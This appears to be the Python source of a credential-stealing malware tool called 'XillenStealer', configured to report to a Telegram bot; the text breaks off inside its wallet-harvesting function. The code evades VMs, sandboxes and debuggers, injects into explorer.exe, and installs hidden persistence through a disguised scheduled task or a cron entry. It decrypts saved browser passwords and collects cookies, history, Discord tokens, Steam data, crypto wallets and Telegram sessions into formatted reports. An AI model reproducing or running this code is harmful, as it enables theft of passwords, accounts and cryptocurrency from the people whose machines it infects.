import os
import sys
import sqlite3
import browser_cookie3
from PIL import ImageGrab
import telebot
import shutil
import re
import ctypes
import json
import platform
import socket
import uuid
import psutil
import datetime
import requests
import base64
from Crypto.Cipher import AES
from glob import glob
import tempfile
import getpass
import stat
import subprocess
import traceback
import html
import zipfile
import time
import threading
import win32api
import win32con
import win32process
import win32com.client
import configparser
import xml.etree.ElementTree as ET

# ===== CONFIG SECTION =====
TG_BOT_TOKEN = "YOUR_BOT_TOKEN"
TG_CHAT_ID = "YOUR_CHAT_ID"
EXTRA_FEATURES = {
    'discord': True,
    'steam': True,
    'wallets': True,
    'autostart': True,
    'telegram': True,
    'microphone': False,
    'webcam': False,
    'game_launchers': True,
    'file_grabber': False
}
OPTIONS = "--hidden"

bot = telebot.TeleBot(TG_BOT_TOKEN)
DEBUG = True
OS_TYPE = platform.system()

SIGNATURE = "Создано командой Xillen Killers (t.me/XillenAdapter) | https://github.com/BengaminButton"

def log(message):
    if DEBUG:
        print(f"[DEBUG] {message}")
    with open("debug.log", "a", encoding="utf-8") as f:
        f.write(f"[{datetime.datetime.now()}] {message}\n")

def check_vm_sandbox():
    indicators = []
    try:
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        vm_mac_prefixes = ['00:0C:29', '00:50:56', '08:00:27', '00:05:69']
        if any(mac.startswith(prefix) for prefix in vm_mac_prefixes):
            indicators.append(f"VM MAC detected: {mac}")
    except:
        pass

    try:
        if OS_TYPE == "Windows":
            wmi = win32com.client.GetObject("winmgmts:")
            for item in wmi.InstancesOf("Win32_ComputerSystem"):
                manufacturer = item.Manufacturer.lower()
                model = item.Model.lower()
                if any(x in manufacturer for x in ['vmware', 'virtual', 'qemu', 'xen', 'innotek']) or \
                   any(x in model for x in ['vmware', 'virtual', 'qemu', 'xen', 'virtualbox']):
                    indicators.append(f"VM detected: {manufacturer} {model}")
    except:
        pass

    try:
        vm_processes = ['vmtoolsd.exe', 'VBoxService.exe', 'vboxservice.exe', 'vboxtray.exe']
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in vm_processes:
                indicators.append(f"VM process: {proc.info['name']}")
    except:
        pass

    try:
        if OS_TYPE == "Windows":
            vm_drivers = ['vm3dgl.sys', 'vmmouse.sys', 'vmhgfs.sys', 'vboxguest.sys', 'vboxsf.sys']
            for driver in vm_drivers:
                try:
                    if ctypes.windll.kernel32.GetModuleHandleA(driver.encode()) != 0:
                        indicators.append(f"VM driver: {driver}")
                except:
                    continue
    except:
        pass

    try:
        if OS_TYPE == "Windows":
            if ctypes.windll.kernel32.IsDebuggerPresent():
                indicators.append("Debugger detected")
            if ctypes.windll.kernel32.GetModuleHandleA("SbieDll.dll".encode()) != 0:
                indicators.append("Sandboxie detected")
        else:
            try:
                with open(f"/proc/{os.getpid()}/status") as f:
                    status = f.read()
                if "TracerPid:" in status and "TracerPid: 0" not in status:
                    indicators.append("Debugger detected")
            except:
                pass
    except:
        pass

    try:
        if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:
            indicators.append("Low RAM - possible VM")
        if psutil.cpu_count(logical=False) < 2:
            indicators.append("Low CPU cores - possible VM")
    except:
        pass

    return indicators

def inject_into_process(target_process="explorer.exe"):
    if OS_TYPE != "Windows":
        return False
        
    try:
        target_pid = None
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == target_process.lower():
                target_pid = proc.info['pid']
                break
                
        if target_pid is None:
            return False
            
        process_handle = ctypes.windll.kernel32.OpenProcess(
            win32con.PROCESS_ALL_ACCESS, False, target_pid
        )
        
        if not process_handle:
            return False
            
        memory_address = ctypes.windll.kernel32.VirtualAllocEx(
            process_handle,
            0,
            len(sys.argv[0]),
            win32con.MEM_COMMIT | win32con.MEM_RESERVE,
            win32con.PAGE_EXECUTE_READWRITE
        )
        
        if not memory_address:
            ctypes.windll.kernel32.CloseHandle(process_handle)
            return False
        
        written = ctypes.c_ulong(0)
        success = ctypes.windll.kernel32.WriteProcessMemory(
            process_handle,
            memory_address,
            sys.argv[0],
            len(sys.argv[0]),
            ctypes.byref(written)
        )
        
        if not success:
            ctypes.windll.kernel32.VirtualFreeEx(process_handle, memory_address, 0, win32con.MEM_RELEASE)
            ctypes.windll.kernel32.CloseHandle(process_handle)
            return False
        
        thread_id = ctypes.c_ulong(0)
        thread_handle = ctypes.windll.kernel32.CreateRemoteThread(
            process_handle,
            None,
            0,
            memory_address,
            None,
            0,
            ctypes.byref(thread_id)
        )
        
        if not thread_handle:
            ctypes.windll.kernel32.VirtualFreeEx(process_handle, memory_address, 0, win32con.MEM_RELEASE)
            ctypes.windll.kernel32.CloseHandle(process_handle)
            return False
        
        ctypes.windll.kernel32.CloseHandle(thread_handle)
        ctypes.windll.kernel32.CloseHandle(process_handle)
        
        return True
    except Exception as e:
        log(f"Injection failed: {str(e)}")
        return False

def install_persistence():
    try:
        if OS_TYPE == "Windows":
            scheduler = win32com.client.Dispatch("Schedule.Service")
            scheduler.Connect()
            root_folder = scheduler.GetFolder("\\")
            
            task_def = scheduler.NewTask(0)
            
            trigger = task_def.Triggers.Create(9)
            trigger.UserId = getpass.getuser()
            
            action = task_def.Actions.Create(0)
            action.Path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
            
            task_def.RegistrationInfo.Description = "System Maintenance Task"
            task_def.Settings.Enabled = True
            task_def.Settings.Hidden = True
            
            task = root_folder.RegisterTaskDefinition(
                "WindowsSystemMaintenance",
                task_def,
                6,
                None, None, 3
            )
            return True
            
        elif OS_TYPE == "Linux":
            cron_line = f"@reboot {sys.executable if hasattr(sys, 'frozen') else sys.argv[0]} >/dev/null 2>&1"
            cron_file = f"/var/spool/cron/crontabs/{getpass.getuser()}"
            
            if os.path.exists(cron_file):
                with open(cron_file, "a") as f:
                    f.write(f"\n{cron_line}\n")
            else:
                with open(cron_file, "w") as f:
                    f.write(f"{cron_line}\n")
                    
            subprocess.run(["crontab", cron_file], check=True)
            return True
            
    except Exception as e:
        log(f"Persistence install failed: {str(e)}")
        return False
        
    return False

def copy_db(src, dest):
    max_retries = 3
    retry_delay = 1
    
    for attempt in range(max_retries):
        try:
            if OS_TYPE == "Windows":
                try:
                    import win32file
                    handle = win32file.CreateFile(src, win32file.GENERIC_READ, 
                                                 win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE | win32file.FILE_SHARE_DELETE,
                                                 None, win32file.OPEN_EXISTING, 0, None)
                    win32file.CloseHandle(handle)
                except:
                    pass
            
            shutil.copy2(src, dest)
            if OS_TYPE != "Windows":
                os.chmod(dest, stat.S_IWRITE | stat.S_IREAD)
            return True
        except Exception as e:
            if attempt == max_retries - 1:
                log(f"Ошибка копирования БД {src}: {str(e)}")
                return False
            time.sleep(retry_delay)
    
    return False

def get_browser_data(browser_name, cookie_func, profile_paths, history_path):
    results = {
        "cookies": [],
        "passwords": [],
        "history": [],
        "credit_cards": []
    }
    
    try:
        cookies = cookie_func(domain_name='')
        for cookie in cookies:
            if any(keyword in cookie.name.lower() for keyword in ['login', 'auth', 'session', 'token']):
                results["cookies"].append(f"{cookie.domain} | {cookie.name}={cookie.value}")
        results["cookies"] = results["cookies"][:50]
    except Exception as e:
        results["cookies"] = [f"Ошибка cookies: {str(e)}"]
    
    for profile_path in profile_paths:
        if not os.path.isdir(profile_path):
            continue
            
        try:
            key = get_encryption_key(profile_path)
            
            login_db = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_db):
                temp_db = os.path.join(tempfile.gettempdir(), f"temp_login_db_{os.getpid()}_{int(time.time())}")
                if copy_db(login_db, temp_db):
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    try:
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        for url, user, passw in cursor.fetchall():
                            try:
                                if isinstance(passw, bytes):
                                    decrypted = decrypt_password(passw, key)
                                else:
                                    decrypted = "[NOT_BYTES]"
                                    
                                if user and decrypted not in ["[DECRYPT_FAIL]", "[NO_KEY]"]:
                                    results["passwords"].append(f"{url} | {user} | {decrypted}")
                            except Exception as e:
                                log(f"Ошибка обработки пароля: {str(e)}")
                    except sqlite3.Error as e:
                        log(f"Ошибка SQLite: {str(e)}")
                    
                    conn.close()
                    try:
                        os.remove(temp_db)
                    except:
                        pass
            
            history_db = os.path.join(profile_path, history_path)
            if os.path.exists(history_db):
                temp_db = os.path.join(tempfile.gettempdir(), f"temp_history_db_{os.getpid()}_{int(time.time())}")
                if copy_db(history_db, temp_db):
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    try:
                        if browser_name == "Firefox":
                            cursor.execute("SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 100")
                            for url, title, visit_time in cursor.fetchall():
                                if visit_time:
                                    dt = datetime.datetime.fromtimestamp(visit_time / 1000000)
                                    results["history"].append(f"{dt.strftime('%Y-%m-%d %H:%M')} | {title[:50]} | {url}")
                        else:
                            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                            for url, title, visit_time in cursor.fetchall():
                                if visit_time:
                                    if OS_TYPE == "Windows":
                                        dt = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=visit_time)
                                    else:
                                        dt = datetime.datetime.fromtimestamp(visit_time / 1000000)
                                    results["history"].append(f"{dt.strftime('%Y-%m-%d %H:%M')} | {title[:50]} | {url}")
                    except sqlite3.Error as e:
                        log(f"Ошибка SQLite истории: {str(e)}")
                    
                    conn.close()
                    try:
                        os.remove(temp_db)
                    except:
                        pass
                        
        except Exception as e:
            log(f"Ошибка обработки профиля {profile_path}: {str(e)}")
    
    results["passwords"] = results["passwords"][:50]
    results["history"] = results["history"][:100]
    
    return results

def generate_html_report(report):
    html_content = f"""
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>XillenStealer Report</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            :root {{
                /* Dark theme */
                --bg-main: #18191d;
                --bg-secondary: #1e1f23;
                --bg-card: #2a2b2f;
                --text-primary: #ffffff;
                --text-secondary: #b0b0b0;
                --accent: #444444;
                --accent-hover: #555555;
                --shadow: rgba(0, 0, 0, 0.3);
                --border: #333333;
                --card-shadow: rgba(0, 0, 0, 0.3);
                --glow: rgba(68, 68, 68, 0.3);
                --success: #28a745;
                --warning: #ffc107;
                --danger: #dc3545;
                --info: #17a2b8;
            }}

            * {{
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }}

            body {{
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: var(--bg-main);
                color: var(--text-primary);
                line-height: 1.6;
                overflow-x: hidden;
            }}

            .container {{
                max-width: 1400px;
                margin: 0 auto;
                padding: 0 2rem;
            }}

            /* Header */
            header {{
                background: var(--bg-main);
                border-bottom: 1px solid var(--border);
                position: sticky;
                top: 0;
                z-index: 100;
                animation: slideDown 0.8s ease-out;
            }}

            @keyframes slideDown {{
                from {{
                    transform: translateY(-100%);
                    opacity: 0;
                }}
                to {{
                    transform: translateY(0);
                    opacity: 1;
                }}
            }}

            nav {{
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 1.2rem 0;
            }}

            .logo {{
                display: flex;
                align-items: center;
                gap: 15px;
                font-size: 1.4rem;
                font-weight: 700;
                color: var(--text-primary);
                letter-spacing: 2px;
                text-transform: uppercase;
                text-decoration: none;
                animation: glow 2s ease-in-out infinite alternate;
                position: relative;
                transition: all 0.3s ease;
            }}

            .logo:hover {{
                transform: scale(1.05);
                text-shadow: 0 0 30px var(--text-primary), 0 0 40px var(--text-primary);
            }}

            .logo img {{
                width: 40px;
                height: 40px;
                border-radius: 50%;
                border: 2px solid var(--accent);
                box-shadow: 0 0 20px var(--glow);
                transition: all 0.3s ease;
            }}

            .logo:hover img {{
                box-shadow: 0 0 30px var(--accent);
                transform: rotate(360deg);
            }}

            @keyframes glow {{
                from {{
                    text-shadow: 0 0 5px var(--text-primary);
                }}
                to {{
                    text-shadow: 0 0 20px var(--text-primary), 0 0 30px var(--text-primary);
                }}
            }}

            .header-info {{
                text-align: right;
                color: var(--text-secondary);
                font-size: 0.9rem;
            }}

            /* Main Content */
            .main-content {{
                padding: 2rem 0;
            }}

            .report-header {{
                background: linear-gradient(135deg, var(--bg-card) 0%, var(--bg-secondary) 100%);
                border-radius: 15px;
                padding: 2rem;
                margin-bottom: 2rem;
                text-align: center;
                box-shadow: 0 10px 30px var(--card-shadow);
                border: 1px solid var(--border);
                animation: fadeInUp 1s ease;
            }}

            .report-header h1 {{
                font-size: 2.5rem;
                margin-bottom: 1rem;
                background: linear-gradient(45deg, var(--text-primary), var(--accent));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
            }}

            .report-header p {{
                font-size: 1.1rem;
                color: var(--text-secondary);
            }}

            .stats-grid {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 1.5rem;
                margin-bottom: 2rem;
            }}

            .stat-card {{
                background: var(--bg-card);
                border-radius: 12px;
                padding: 1.5rem;
                text-align: center;
                box-shadow: 0 5px 20px var(--card-shadow);
                border: 1px solid var(--border);
                transition: all 0.3s ease;
                animation: fadeInUp 0.8s ease;
            }}

            .stat-card:hover {{
                transform: translateY(-5px);
                box-shadow: 0 10px 30px var(--card-shadow);
            }}

            .stat-card i {{
                font-size: 2rem;
                margin-bottom: 1rem;
                color: var(--accent);
            }}

            .stat-card h3 {{
                font-size: 2rem;
                margin-bottom: 0.5rem;
                color: var(--text-primary);
            }}

            .stat-card p {{
                color: var(--text-secondary);
                font-size: 0.9rem;
            }}

            .content-grid {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
                gap: 1.5rem;
                margin-bottom: 2rem;
            }}

            .content-card {{
                background: var(--bg-card);
                border-radius: 12px;
                padding: 1.5rem;
                box-shadow: 0 5px 20px var(--card-shadow);
                border: 1px solid var(--border);
                transition: all 0.3s ease;
                animation: fadeInUp 0.8s ease;
            }}

            .content-card:hover {{
                transform: translateY(-3px);
                box-shadow: 0 8px 25px var(--card-shadow);
            }}

            .content-card h2 {{
                color: var(--accent);
                margin-bottom: 1rem;
                font-size: 1.3rem;
                display: flex;
                align-items: center;
                gap: 10px;
                border-bottom: 1px solid var(--border);
                padding-bottom: 0.5rem;
            }}

            .content-card h2 i {{
                color: var(--accent);
            }}

            .card-content {{
                max-height: 300px;
                overflow-y: auto;
                padding-right: 10px;
            }}

            .card-content::-webkit-scrollbar {{
                width: 6px;
            }}

            .card-content::-webkit-scrollbar-track {{
                background: var(--bg-secondary);
                border-radius: 3px;
            }}

            .card-content::-webkit-scrollbar-thumb {{
                background: var(--accent);
                border-radius: 3px;
            }}

            .card-content::-webkit-scrollbar-thumb:hover {{
                background: var(--accent-hover);
            }}

            pre {{
                background: var(--bg-secondary);
                color: var(--text-primary);
                padding: 1rem;
                border-radius: 8px;
                overflow-x: auto;
                font-size: 0.85rem;
                border: 1px solid var(--border);
                max-height: 250px;
                overflow-y: auto;
                font-family: 'Consolas', 'Monaco', monospace;
            }}

            .section {{
                margin-bottom: 2rem;
                animation: fadeInUp 0.8s ease;
            }}

            .section-title {{
                font-size: 1.8rem;
                color: var(--accent);
                margin-bottom: 1.5rem;
                padding-bottom: 0.5rem;
                border-bottom: 2px solid var(--border);
                display: flex;
                align-items: center;
                gap: 10px;
            }}

            .section-title i {{
                color: var(--accent);
            }}

            /* Footer */
            footer {{
                background: var(--bg-card);
                border-radius: 12px;
                padding: 2rem;
                text-align: center;
                box-shadow: 0 5px 20px var(--card-shadow);
                border: 1px solid var(--border);
                margin-top: 2rem;
                animation: fadeInUp 1s ease;
            }}

            footer p {{
                margin-bottom: 1rem;
                color: var(--text-secondary);
            }}

            footer a {{
                color: var(--accent);
                text-decoration: none;
                transition: color 0.3s ease;
            }}

            footer a:hover {{
                color: var(--accent-hover);
                text-decoration: underline;
            }}

            .btn {{
                display: inline-block;
                background: linear-gradient(135deg, var(--accent) 0%, var(--accent-hover) 100%);
                color: white;
                padding: 12px 25px;
                border-radius: 8px;
                text-decoration: none;
                font-weight: bold;
                margin: 10px 0;
                border: none;
                cursor: pointer;
                transition: all 0.3s ease;
                box-shadow: 0 5px 15px var(--card-shadow);
                font-size: 0.9rem;
            }}

            .btn:hover {{
                transform: translateY(-2px);
                box-shadow: 0 8px 20px var(--card-shadow);
            }}

            .btn i {{
                margin-right: 8px;
            }}

            @keyframes fadeInUp {{
                from {{
                    opacity: 0;
                    transform: translateY(30px);
                }}
                to {{
                    opacity: 1;
                    transform: translateY(0);
                }}
            }}

            @keyframes fadeIn {{
                from {{ opacity: 0; }}
                to {{ opacity: 1; }}
            }}

            /* Responsive */
            @media (max-width: 768px) {{
                .container {{
                    padding: 0 1rem;
                }}
                
                .content-grid {{
                    grid-template-columns: 1fr;
                }}
                
                .stats-grid {{
                    grid-template-columns: repeat(2, 1fr);
                }}
                
                .report-header h1 {{
                    font-size: 2rem;
                }}
            }}
        </style>
        <script>
            function saveAsTxt() {{
                const content = `{generate_txt_report(report).replace('`', '\\`')}`;
                const blob = new Blob([content], {{ type: 'text/plain' }});
                const url = URL.createObjectURL(blob);
                
                const a = document.createElement('a');
                a.href = url;
                a.download = 'xillen_report.txt';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            }}
            
            document.addEventListener('DOMContentLoaded', function() {{
                const cards = document.querySelectorAll('.content-card, .stat-card');
                cards.forEach((card, index) => {{
                    card.style.animationDelay = `${{index * 0.1}}s`;
                }});
            }});
        </script>
    </head>
    <body>
        <header>
            <div class="container">
                <nav>
                    <div class="header-info">
                        <div>XillenStealer v3.0</div>
                        <div>{datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</div>
                    </div>
                </nav>
            </div>
        </header>

        <main class="main-content">
            <div class="container">
                <div class="report-header">
                    <h1><i class="fas fa-shield-alt"></i> XillenStealer Report</h1>
                    <p>Полный отчет о системе и собранных данных</p>
                </div>

                <div class="stats-grid">
                    <div class="stat-card">
                        <i class="fas fa-desktop"></i>
                        <h3>{len(report['browsers'])}</h3>
                        <p>Браузеров</p>
                    </div>
                    <div class="stat-card">
                        <i class="fas fa-key"></i>
                        <h3>{sum(len(data.get('passwords', [])) for data in report['browsers'].values())}</h3>
                        <p>Паролей</p>
                    </div>
                    <div class="stat-card">
                        <i class="fas fa-cookie-bite"></i>
                        <h3>{sum(len(data.get('cookies', [])) for data in report['browsers'].values())}</h3>
                        <p>Куки</p>
                    </div>
                    <div class="stat-card">
                        <i class="fas fa-history"></i>
                        <h3>{sum(len(data.get('history', [])) for data in report['browsers'].values())}</h3>
                        <p>История</p>
                    </div>
                </div>

                <div class="content-grid">
                    <div class="content-card">
                        <h2><i class="fas fa-info-circle"></i> Системная информация</h2>
                        <div class="card-content">
                            <pre>{html.escape(report['system_info'])}</pre>
                        </div>
                    </div>
                    
                    <div class="content-card">
                        <h2><i class="fas fa-shield-alt"></i> Анти-отладка</h2>
                        <div class="card-content">
                            <pre>{html.escape('\n'.join(report['anti_debug']))}</pre>
                        </div>
                    </div>
                </div>

                <div class="section">
                    <h2 class="section-title"><i class="fas fa-globe"></i> Данные браузеров</h2>
                    <div class="content-grid">
                        {generate_browsers_html(report['browsers'])}
                    </div>
                </div>
                
                {generate_extra_data_html(report)}
                
                <footer style="margin: 40px auto 0 auto; max-width: 600px; background: #23242a; border-radius: 18px; box-shadow: 0 4px 32px rgba(0,0,0,0.25); border: 2px solid #e5e5e5; padding: 24px 32px; text-align: center; font-family: 'Minecraft', 'Segoe UI', Arial, sans-serif; color: #e5e5e5;">
            <div style="font-size: 1.1rem; margin-bottom: 8px;">
                <b>Создано командой 
                    <a href='https://t.me/XillenAdapter' style='color:#e5e5e5;text-decoration:underline;' target='_blank'>Xillen Killers</a>
                </b>
            </div>
            <div style="font-size: 1rem;">
                <a href='https://t.me/XillenAdapter' style='color:#e5e5e5;text-decoration:underline;' target='_blank'>t.me/XillenAdapter</a> |
                <a href='https://github.com/BengaminButton' style='color:#e5e5e5;text-decoration:underline;' target='_blank'>github.com/BengaminButton</a>
            </div>
        </footer>
            </div>
        </main>
    </body>
    </html>
    """
    return html_content

def generate_txt_report(report):
    txt_content = f"""
    ╔══════════════════════════════════════════════════════════════╗
    ║                   XillenStealer Report v3.0                 ║
    ║                 https://github.com/BengaminButton           ║
    ║                   t.me/Xillen_Adapter                       ║
    ╚══════════════════════════════════════════════════════════════╝
    
    Дата: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    
    === СИСТЕМНАЯ ИНФОРМАЦИЯ ===
    {report['system_info']}
    
    === АНТИ-ОТЛАДКА ===
    {chr(10).join(report['anti_debug'])}
    
    === ДАННЫЕ БРАУЗЕРОВ ===
    """
    
    for browser, data in report['browsers'].items():
        txt_content += f"\n--- {browser} ---\n"
        if data['passwords']:
            txt_content += f"Пароли ({len(data['passwords'])}):\n"
            txt_content += "\n".join(data['passwords']) + "\n"
        
        if data['cookies']:
            txt_content += f"Куки ({len(data['cookies'])}):\n"
            txt_content += "\n".join(data['cookies']) + "\n"
        
        if data['history']:
            txt_content += f"История ({len(data['history'])}):\n"
            txt_content += "\n".join(data['history']) + "\n"
    
    if report.get('discord_tokens') and report['discord_tokens'][0] != "Токены Discord не найдены":
        txt_content += f"\n=== DISCORD ТОКЕНЫ ===\n"
        txt_content += "\n".join(report['discord_tokens']) + "\n"
    
    if report.get('steam_data') and report['steam_data'][0] != "Steam аккаунты не найдены":
        txt_content += f"\n=== STEAM АККАУНТЫ ===\n"
        txt_content += "\n".join(report['steam_data']) + "\n"
    
    if report.get('wallets') and report['wallets'][0] != "Кошельки не обнаружены":
        txt_content += f"\n=== КРИПТО-КОШЕЛЬКИ ===\n"
        txt_content += "\n".join(report['wallets']) + "\n"
    
    if report.get('telegram_sessions') and report['telegram_sessions'][0] != "Telegram сессии не найдены":
        txt_content += f"\n=== TELEGRAM СЕССИИ ===\n"
        for session in report['telegram_sessions']:
            txt_content += f"Найден: {session}\n"
            
    if report.get('game_launchers') and report['game_launchers'][0] != "Игровые лаунчеры не найдены":
        txt_content += f"\n=== ИГРОВЫЕ ЛАУНЧЕРЫ ===\n"
        for launcher in report['game_launchers']:
            txt_content += f"{launcher}\n"
    
    return txt_content

def generate_browsers_html(browsers_data):
    html_content = ""
    for browser, data in browsers_data.items():
        browser_icon = "🌐"
        if "chrome" in browser.lower():
            browser_icon = "🟢"
        elif "firefox" in browser.lower():
            browser_icon = "🦊"
        elif "edge" in browser.lower():
            browser_icon = "🔵"
        elif "opera" in browser.lower():
            browser_icon = "🔴"
        
        html_content += f"""
        <div class="content-card">
            <h2><i class="fas fa-globe"></i> {browser_icon} {browser}</h2>
            <div class="card-content">
                <h4 style="color: var(--accent); margin: 1rem 0 0.5rem 0; font-size: 1rem;"><i class="fas fa-key"></i> Пароли ({len(data['passwords'])})</h4>
                <pre style="margin-bottom: 1rem;">{html.escape('\n'.join(data['passwords'][:10]))}</pre>
                
                <h4 style="color: var(--accent); margin: 1rem 0 0.5rem 0; font-size: 1rem;"><i class="fas fa-cookie-bite"></i> Куки ({len(data['cookies'])})</h4>
                <pre style="margin-bottom: 1rem;">{html.escape('\n'.join(data['cookies'][:10]))}</pre>
                
                <h4 style="color: var(--accent); margin: 1rem 0 0.5rem 0; font-size: 1rem;"><i class="fas fa-history"></i> История ({len(data['history'])})</h4>
                <pre>{html.escape('\n'.join(data['history'][:10]))}</pre>
            </div>
        </div>
        """
    return html_content

def generate_extra_data_html(report):
    html_content = ""
    
    if report.get('discord_tokens') and report['discord_tokens'][0] != "Токены Discord не найдены":
        html_content += f"""
        <div class="section">
            <h2 class="section-title"><i class="fab fa-discord"></i> Discord токены</h2>
            <div class="content-grid">
                <div class="content-card">
                    <h2><i class="fab fa-discord"></i> Discord токены ({len(report['discord_tokens'])})</h2>
                    <div class="card-content">
                        <pre>{html.escape('\n'.join(report['discord_tokens']))}</pre>
                    </div>
                </div>
            </div>
        </div>
        """
    
    if report.get('steam_data') and report['steam_data'][0] != "Steam аккаунты не найдены":
        html_content += f"""
        <div class="section">
            <h2 class="section-title"><i class="fab fa-steam"></i> Steam аккаунты</h2>
            <div class="content-grid">
                <div class="content-card">
                    <h2><i class="fab fa-steam"></i> Steam аккаунты ({len(report['steam_data'])})</h2>
                    <div class="card-content">
                        <pre>{html.escape('\n'.join(report['steam_data']))}</pre>
                    </div>
                </div>
            </div>
        </div>
        """
    
    if report.get('wallets') and report['wallets'][0] != "Кошельки не обнаружены":
        html_content += f"""
        <div class="section">
            <h2 class="section-title"><i class="fas fa-wallet"></i> Крипто-кошельки</h2>
            <div class="content-grid">
                <div class="content-card">
                    <h2><i class="fas fa-wallet"></i> Крипто-кошельки ({len(report['wallets'])})</h2>
                    <div class="card-content">
                        <pre>{html.escape('\n'.join(report['wallets']))}</pre>
                    </div>
                </div>
            </div>
        </div>
        """
    
    if report.get('telegram_sessions') and report['telegram_sessions'][0] != "Telegram сессии не найдены":
        sessions_formatted = [f"Найден: {s}" for s in report['telegram_sessions']]
        html_content += f"""
        <div class="section">
            <h2 class="section-title"><i class="fab fa-telegram"></i> Telegram сессии</h2>
            <div class="content-grid">
                <div class="content-card">
                    <h2><i class="fab fa-telegram"></i> Telegram сессии ({len(report['telegram_sessions'])})</h2>
                    <div class="card-content">
                        <pre>{html.escape('\n'.join(sessions_formatted))}</pre>
                    </div>
                </div>
            </div>
        </div>
        """
        
    if report.get('game_launchers') and report['game_launchers'][0] != "Игровые лаунчеры не найдены":
        html_content += f"""
        <div class="section">
            <h2 class="section-title"><i class="fas fa-gamepad"></i> Игровые лаунчеры</h2>
            <div class="content-grid">
                <div class="content-card">
                    <h2><i class="fas fa-gamepad"></i> Игровые лаунчеры ({len(report['game_launchers'])})</h2>
                    <div class="card-content">
                        <pre>{html.escape('\n'.join(report['game_launchers']))}</pre>
                    </div>
                </div>
            </div>
        </div>
        """
    
    return html_content

def get_system_info():
    info = []
    info.append(f"🕒 Время запуска: {datetime.datetime.now()}")
    info.append(f"👤 Пользователь: {getpass.getuser()}")
    info.append(f"💻 Имя ПК: {platform.node()}")
    info.append(f"🖥️ ОС: {platform.system()} {platform.release()} {platform.version()}")
    info.append(f"🔢 Архитектура: {platform.machine()}")
    
    info.append("\n⚙️ CPU:")
    info.append(f"Процессор: {platform.processor()}")
    info.append(f"Ядер: {psutil.cpu_count(logical=False)}")
    info.append(f"Потоков: {psutil.cpu_count(logical=True)}")
    
    mem = psutil.virtual_memory()
    info.append("\n🧠 RAM:")
    info.append(f"Всего: {round(mem.total / (1024**3), 2)} GB")
    info.append(f"Используется: {round(mem.used / (1024**3), 2)} GB")
    
    info.append("\n💾 Диски:")
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            info.append(f"{part.device} ({part.fstype}) - {round(usage.total / (1024**3), 2)}GB, {usage.percent}% used")
        except:
            continue
    
    info.append("\n🎮 GPU:")
    try:
        import GPUtil
        gpus = GPUtil.getGPUs()
        for gpu in gpus:
            info.append(f"{gpu.name} - {gpu.load*100}% load, {gpu.memoryUsed}MB/{gpu.memoryTotal}MB")
    except:
        info.append("Не удалось получить информацию о GPU")
    
    info.append("\n🌐 Сеть:")
    try:
        hostname = socket.gethostname()
        try:
            ip_local = socket.gethostbyname(hostname)
        except:
            ip_local = "127.0.0.1"
        info.append(f"Hostname: {hostname}")
        info.append(f"Локальный IP: {ip_local}")
        
        try:
            ip_external = requests.get('https://api.ipify.org', timeout=10).text
            info.append(f"Внешний IP: {ip_external}")
        except:
            info.append("Не удалось получить внешний IP")
        
        try:
            mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
            info.append(f"MAC адрес: {mac}")
        except:
            info.append("MAC адрес: недоступен")
    except:
        info.append("Ошибка получения сетевой информации")
    
    return "\n".join(info)

def get_encryption_key(browser_path):
    try:
        if OS_TYPE == "Windows":
            import win32crypt
            local_state_path = os.path.join(os.path.dirname(browser_path), "Local State")
            if not os.path.exists(local_state_path):
                return None
                
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            return win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
        
        elif OS_TYPE == "Linux":
            try:
                import secretstorage
                bus = secretstorage.dbus_init()
                collection = secretstorage.get_default_collection(bus)
                if not collection.is_locked():
                    items = collection.search_items({'application': 'chrome'})
                    for item in items:
                        return item.get_secret().decode()
                return None
            except Exception as e:
                log(f"Ошибка получения ключа для Linux: {str(e)}")
                return None
                
    except Exception as e:
        log(f"Ошибка получения ключа: {str(e)}")
        return None

def decrypt_password(password, key):
    try:
        if not key:
            return "[NO_KEY]"
            
        if password.startswith(b'v10') or password.startswith(b'v11'):
            nonce = password[3:15]
            ciphertext = password[15:-16]
            tag = password[-16:]
            
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            plaintext = cipher.decrypt_and_verify(ciphertext, tag)
            return plaintext.decode('utf-8', errors='replace')
        
        else:
            iv = password[3:15]
            payload = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode('utf-8', errors='replace')
            
    except Exception as e:
        log(f"Ошибка дешифровки: {str(e)}")
        return "[DECRYPT_FAIL]"

def get_wallets():
    wallets = []
    wallet_paths = []
    
    if OS_TYPE == "Windows":
        wallet_paths = [
